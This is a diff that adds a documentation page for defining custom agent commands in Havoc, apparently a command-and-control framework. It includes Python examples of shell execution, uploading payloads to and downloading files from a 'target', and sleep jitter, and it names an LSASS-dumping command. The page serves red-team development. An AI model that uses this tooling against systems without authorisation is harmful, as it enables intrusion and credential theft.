@@ -1,0 +1,431 @@
+---
+title: Command
+description: Define custom commands for your agent
+icon: terminal
+---
+
+## Overview
+
+The `Command` class allows you to define custom commands that operators can execute through your agent in the Havoc client. Each command specifies its parameters, permissions, and generates a task payload for the agent to execute.
+
+## Class Definition
+
+```python
+from havoc.agent import Command, CommandParam
+
+class CommandShell(Command):
+    CommandId = 0x101
+    Name = "shell"
+    Description = "executes commands using cmd.exe"
+    Help = ""
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="commands",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = []
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        pass
+```
+
+## Required Attributes
+
+<ParamField path="CommandId" type="int" required>
+  Unique identifier for the command. Should match the command ID in your agent implementation.
+  
+  Example: `0x101` or `COMMAND_SHELL`
+</ParamField>
+
+<ParamField path="Name" type="string" required>
+  Command name as typed by operators in the Havoc client console.
+  
+  Example: `"shell"`, `"upload"`, `"screenshot"`
+</ParamField>
+
+<ParamField path="Description" type="string" required>
+  Brief description of what the command does.
+</ParamField>
+
+<ParamField path="Help" type="string">
+  Detailed help text displayed when operators run `help [command]`.
+</ParamField>
+
+<ParamField path="NeedAdmin" type="bool" required>
+  Whether the command requires administrator/elevated privileges.
+  
+  - `True`: Command requires admin rights
+  - `False`: Command works with normal privileges
+</ParamField>
+
+<ParamField path="Params" type="list[CommandParam]" required>
+  List of parameters the command accepts. Can be an empty list `[]` for commands with no parameters.
+</ParamField>
+
+<ParamField path="Mitr" type="list[string]">
+  List of MITRE ATT&CK technique IDs associated with this command.
+  
+  Example: `["T1059.003", "T1106"]`
+</ParamField>
+
+## CommandParam
+
+Defines a command parameter with validation rules.
+
+```python
+CommandParam(
+    name="parameter_name",
+    is_file_path=False,
+    is_optional=False
+)
+```
+
+<ParamField path="name" type="string" required>
+  Parameter name as used in the arguments dictionary.
+</ParamField>
+
+<ParamField path="is_file_path" type="bool" required>
+  Whether the parameter expects a file path. When `True`, Havoc validates the file exists.
+</ParamField>
+
+<ParamField path="is_optional" type="bool" required>
+  Whether the parameter is optional. When `False`, the command requires this parameter.
+</ParamField>
+
+## Required Methods
+
+### job_generate()
+
+Generates the task payload to send to the agent. This method is called when an operator executes the command.
+
+**Parameters:**
+
+<ParamField path="arguments" type="dict" required>
+  Dictionary containing parameter values where keys match the parameter names defined in `Params`.
+</ParamField>
+
+**Returns:** `bytes` - The packed task payload to send to the agent
+
+```python
+def job_generate(self, arguments: dict) -> bytes:
+    from havoc.agent import Packer
+    
+    task = Packer()
+    task.add_int(self.CommandId)
+    task.add_data(arguments['param_name'])
+    
+    return task.buffer
+```
+
+## Packer Utility
+
+The `Packer` class builds binary task payloads for your agent.
+
+```python
+from havoc.agent import Packer
+
+task = Packer()
+```
+
+### Methods
+
+<ResponseField name="add_int" type="function">
+  Adds a 4-byte integer to the buffer.
+  
+  ```python
+  task.add_int(0x101)
+  task.add_int(1234)
+  ```
+</ResponseField>
+
+<ResponseField name="add_data" type="function">
+  Adds length-prefixed binary data or string to the buffer.
+  
+  ```python
+  task.add_data("whoami")
+  task.add_data(b"\x00\x01\x02\x03")
+  ```
+</ResponseField>
+
+<ResponseField name="buffer" type="bytes">
+  The final packed binary buffer to return from `job_generate()`.
+  
+  ```python
+  return task.buffer
+  ```
+</ResponseField>
+
+## Command Examples
+
+<CodeGroup>
+```python Shell Command
+from havoc.agent import Command, CommandParam, Packer
+
+COMMAND_SHELL = 0x101
+
+class CommandShell(Command):
+    CommandId = COMMAND_SHELL
+    Name = "shell"
+    Description = "executes commands using cmd.exe"
+    Help = "Usage: shell [command]\nExample: shell whoami"
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="commands",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = ["T1059.003"]
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        task = Packer()
+        
+        task.add_int(self.CommandId)
+        task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
+        
+        return task.buffer
+```
+
+```python File Upload Command
+from havoc.agent import Command, CommandParam, Packer
+
+COMMAND_UPLOAD = 0x102
+
+class CommandUpload(Command):
+    CommandId = COMMAND_UPLOAD
+    Name = "upload"
+    Description = "uploads a file to the target"
+    Help = """Usage: upload [local_path] [remote_path]
+Example: upload /tmp/payload.exe C:\\Users\\Public\\file.exe"""
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="local_path",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="remote_path",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = ["T1105"]
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        task = Packer()
+        
+        # Read file contents
+        with open(arguments['local_path'], 'rb') as f:
+            file_data = f.read()
+        
+        task.add_int(self.CommandId)
+        task.add_data(arguments['remote_path'])
+        task.add_data(file_data)
+        
+        return task.buffer
+```
+
+```python Download Command
+from havoc.agent import Command, CommandParam, Packer
+
+COMMAND_DOWNLOAD = 0x103
+
+class CommandDownload(Command):
+    CommandId = COMMAND_DOWNLOAD
+    Name = "download"
+    Description = "downloads a file from the target"
+    Help = "Usage: download [remote_path]\nExample: download C:\\Users\\target\\Documents\\data.txt"
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="remote_path",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = ["T1005", "T1083"]
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        task = Packer()
+        
+        task.add_int(self.CommandId)
+        task.add_data(arguments['remote_path'])
+        
+        return task.buffer
+```
+
+```python Optional Parameters
+from havoc.agent import Command, CommandParam, Packer
+
+COMMAND_SLEEP = 0x104
+
+class CommandSleep(Command):
+    CommandId = COMMAND_SLEEP
+    Name = "sleep"
+    Description = "configure agent sleep interval"
+    Help = """Usage: sleep [delay] [jitter]
+delay: Sleep delay in seconds (required)
+jitter: Jitter percentage 0-100 (optional, default: 0)
+Example: sleep 10 20"""
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="delay",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="jitter",
+            is_file_path=False,
+            is_optional=True
+        )
+    ]
+    Mitr = []
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        task = Packer()
+        
+        delay = int(arguments['delay'])
+        jitter = int(arguments.get('jitter', 0))
+        
+        task.add_int(self.CommandId)
+        task.add_int(delay)
+        task.add_int(jitter)
+        
+        return task.buffer
+```
+
+```python No Parameters
+from havoc.agent import Command, Packer
+
+COMMAND_GETUID = 0x105
+
+class CommandGetuid(Command):
+    CommandId = COMMAND_GETUID
+    Name = "getuid"
+    Description = "retrieves the current user context"
+    Help = "Usage: getuid"
+    NeedAdmin = False
+    Params = []  # No parameters
+    Mitr = ["T1033"]
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        task = Packer()
+        task.add_int(self.CommandId)
+        return task.buffer
+```
+</CodeGroup>
+
+## Registering Commands
+
+Register commands with your agent in the `__init__` method:
+
+```python
+class CustomAgent(AgentType):
+    def __init__(self):
+        super().__init__()
+        
+        # Register all commands
+        self.register_command(CommandShell())
+        self.register_command(CommandUpload())
+        self.register_command(CommandDownload())
+        self.register_command(CommandSleep())
+        self.register_command(CommandGetuid())
+```
+
+## Command Workflow
+
+1. **Operator Input**: Operator types command in Havoc client
+   ```
+   shell whoami
+   ```
+
+2. **Parameter Validation**: Havoc validates parameters against `Params` definition
+
+3. **Job Generation**: `job_generate()` is called with parsed arguments
+   ```python
+   arguments = {'commands': 'whoami'}
+   ```
+
+4. **Task Packing**: Command packs task data using `Packer`
+   ```python
+   task = Packer()
+   task.add_int(COMMAND_SHELL)
+   task.add_data("cmd.exe /c whoami")
+   return task.buffer
+   ```
+
+5. **Transmission**: Packed task is sent to agent via Service API
+
+6. **Agent Execution**: Agent receives, unpacks, and executes the task
+
+7. **Response**: Agent sends results back through the `response()` handler
+
+## Best Practices
+
+<AccordionGroup>
+  <Accordion title="Use Unique Command IDs">
+    Ensure each command has a unique `CommandId` to avoid conflicts. Consider using a hex range:
+    ```python
+    COMMAND_SHELL = 0x100
+    COMMAND_UPLOAD = 0x101
+    COMMAND_DOWNLOAD = 0x102
+    ```
+  </Accordion>
+  
+  <Accordion title="Validate Input">
+    Validate arguments in `job_generate()` before packing:
+    ```python
+    def job_generate(self, arguments: dict) -> bytes:
+        delay = int(arguments['delay'])
+        if delay < 0 or delay > 3600:
+            raise ValueError("Delay must be between 0 and 3600 seconds")
+        # Continue packing...
+    ```
+  </Accordion>
+  
+  <Accordion title="Set Appropriate Permissions">
+    Set `NeedAdmin = True` for commands requiring elevated privileges:
+    ```python
+    class CommandDumpLsass(Command):
+        Name = "dump-lsass"
+        NeedAdmin = True  # Requires admin
+    ```
+  </Accordion>
+  
+  <Accordion title="Include MITRE ATT&CK Tags">
+    Tag commands with relevant MITRE techniques for threat intelligence:
+    ```python
+    Mitr = ["T1003.001"]  # LSASS Memory dumping
+    ```
+  </Accordion>
+  
+  <Accordion title="Write Helpful Documentation">
+    Provide clear help text with usage examples:
+    ```python
+    Help = """Usage: upload [local_path] [remote_path]
+    
+Uploads a file from the operator's machine to the target.
+    
+Examples:
+  upload /tmp/payload.exe C:\\\\Temp\\\\file.exe
+  upload ./script.ps1 C:\\\\Users\\\\Public\\\\script.ps1"""
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Related Resources
+
+<CardGroup cols={2}>
+  <Card title="AgentType" icon="robot" href="/api/python/agent">
+    Learn about agent implementation and response handling
+  </Card>
+  <Card title="HavocService" icon="server" href="/api/python/service">
+    Connect your agent to the Teamserver
+  </Card>
+</CardGroup>
